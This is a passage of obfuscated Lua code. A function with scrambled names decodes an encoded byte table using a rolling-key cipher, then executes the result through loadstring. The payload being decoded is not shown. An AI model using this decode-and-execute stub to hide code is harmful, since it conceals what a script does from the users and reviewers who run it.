    local function VM_IllIOl0(d, k, m)
        local R_OOO0 = {}
        local c_key = k
        local char = string.char
        local insert = table.insert
        
        -- Virtual Machine Loop
        for idx = 1, #d do
            local val = d[idx]
            -- Decodificacao Rolling Key
            local dec = (val / m) - c_key
            
            -- Anti-Crash Mobile (Garante byte valido)
            dec = dec % 256
            
            insert(R_OOO0, char(dec))
            
            -- Atualiza a chave para o proximo (Rolling)
            c_key = (c_key + 13) % 150
        end
        return table.concat(R_OOO0)
    end

    -- Execution Guard
    local F_l0OIOOI = loadstring(VM_IllIOl0(B_10O0I, 16, 5))
    if F_l0OIOOI then
        F_l0OIOOI(...)
    end
end)(...)
